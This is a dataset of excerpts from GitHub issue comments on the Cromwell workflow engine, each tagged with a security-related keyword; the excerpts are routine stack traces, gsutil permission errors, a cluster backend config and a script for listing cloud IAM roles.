bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12478,Access,AccessDeniedException,12478,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:13732,Access,AccessDeniedException,13732,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"pport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder rather than inside `centaur/.../testdir`. This test passes in Travis and it might have different folder structure, which could be the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4748,Validat,Validation,4748,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Validat'],['Validation']
Security,"pport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder rather than inside `centaur/.../testdir`. This",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4661,Validat,Validation,4661,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Validat'],['Validation']
Security,"r(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.se",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7541,secur,security,7541,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"re `5: Write access:` we have to stage stuff in CWL too - maybe even more so than we do in WDL. Regardless, my comment would be that we don't necessarily need to write to the same FS that inputs are coming from - eg if we're running on PAPI would could ""write"" to `gs://...` even if most inputs are coming from `https://...`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-400828579:13,access,access,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-400828579,1,['access'],['access']
Security,re `6: hashes beside CRC32` - yes we *can* use anything. Only if we want to call cache between tasks from different FS's do we need to standardize. That's not been a problem for now between local (`md5`) and GCS (`CRC32C`) because we'd never call cache between local and PAPI anyway,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-400829241:7,hash,hashes,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-400829241,1,['hash'],['hashes']
Security,"reTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder r",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4607,validat,validation,4607,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['validat'],['validation']
Security,"receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttp",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2144,secur,security,2144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['secur'],['security']
Security,"right now that's not the default in FC, nor do we expose it in the UI - people have used it and it does help for some circumstances where you need it, but it seems like overkill when all you want is reliable statuses. it also won't help with the aborting issue which is what the gatk post was",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334489869:50,expose,expose,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334489869,1,['expose'],['expose']
Security,romwell.filesystems.sra.SraPath.nioPathPrivate(SraPathBuilder.scala:26); 	at cromwell.core.path.PathObjectMethods.hashCode(PathObjectMethods.scala:18); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); 	at akka.actor.ActorCell.invoke(ActorCell.scala:581); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(F,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1463,hash,hashCode,1463,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hashCode']
Security,"rrors on our HPC that occur randomly and qsub/qstat go down temporarily and result in `failed (during ExecutingWorkflowState): java.lang.RuntimeException: Unable to start job.`. I was hoping this would retry failed submissions. . This is my current config:. ```; include required(classpath(""application"")). webservice {; port = 8000; interface = 127.0.0.1; }. #call-caching {; # enabled = true; # invalidate-bad-cache-results = true; #}. system {; job-rate-control {; jobs = 20; per = 1 second; }; }. backend {; default = SGE. providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 10; root = ""cromwell-executions""; run-in-background = true. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; String ? docker; String ? docker_user; """""". submit = ""/bin/bash ${script}"". submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """""". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""file""; check-sibling-md5: false; }; }; }; }; }. SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; root = ""cromwell-executions""; exit-code-timeout-seconds = 600; concurrent-job-limit = 100. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; Int cpu = 1; Float ? memory_gb; String sge_queue = ""dgdcloud.q""; String ? sge_project; """""". submit = """"""; qsub \; -terse \; -V \; -b n \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l h_vmem="" + memory_gb / cpu + ""g""} \; ${""-l mem_free="" + memory_gb / cpu + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362:1275,hash,hashing-strategy,1275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362,1,['hash'],['hashing-strategy']
Security,"s test_wf.json --type CWL --type-version v1.0; [2019-04-18 17:19:09,95] [info] Running with database db.url = jdbc:hsqldb:mem:39c64473-526e-47d6-a015-f9193a0fd4f4;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:17,77] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-04-18 17:19:17,78] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-04-18 17:19:17,92] [info] Running with database db.url = jdbc:hsqldb:mem:58f8cd7c-3e36-430d-b36a-1620b0333e3e;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:18,65] [info] Slf4jLogger started; [2019-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromw",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:1543,access,access,1543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"s#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Creator (roles/storage.objectCreator); 4. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Viewer (roles/storage.objectViewer). And I have got the following error from Cromwell:; ```; java.lang.Exception: Task xxx.xxxNA:1 failed. Job exited without an error, exit code 0. PAPI error code 9. Please check the log file for more details: xxx; ```; And the log just contains this cryptic message:; ```; yyyy/mm/dd hh:mm:ss Starting container setup.; ```; I have then tried to run Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (storage.objectAdmin). And the workflow succeeded. To give a full explanation of the set of roles and permissions needed, I wrote a little python script `roles.py` that collects this information from Google:; ```; #!/bin/python3; import subprocess; import requests; import pandas as pd; import sys. token = subprocess.check_output([""gcloud"",""auth"",""print-access-token""]).decode(""utf8"").strip(); response = requests.get(""https://iam.googleapis.com/v1/roles"", headers={""accept"": ""application/json"", ""Authorization"": ""Bearer ""+token}, params={""pageSize"": 1000, ""view"": ""FULL""}); roles_json = response.json()['roles']; roles = [role['name'] for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions']]; permissions = [permission for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions']]. df = pd.DataFrame(dict(roles=roles, permissions=permissions)); df.to_csv(sys.stdout, sep = '\t', header = Fal",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955:1296,access,access-control,1296,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955,1,['access'],['access-control']
Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:2446,Access,AccessDeniedException,2446,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sap",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3066,Access,AccessDeniedException,3066,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
